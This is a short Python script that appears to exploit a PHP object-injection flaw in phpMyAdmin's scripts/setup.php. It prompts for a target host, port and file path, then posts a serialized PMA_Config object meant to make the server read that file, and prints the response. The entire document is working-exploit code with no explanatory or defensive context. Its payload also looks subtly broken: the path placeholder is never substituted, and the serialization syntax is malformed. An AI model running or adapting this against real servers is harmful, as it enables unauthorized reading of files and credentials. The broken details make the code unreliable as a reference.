import requests

RHOST=input("RHOST:")
RPORT=input("RPORT:")
PATH=input("PATH:")

data={"configuration":"O:10:\"PMA_Config\":1:{s:6:\"source\",s:11:\"{PATH}\";}","action":"test"}

res=requests.post(f"http://{RHOST}:{RPORT}/scripts/setup.php",data=data)

print(res.text)
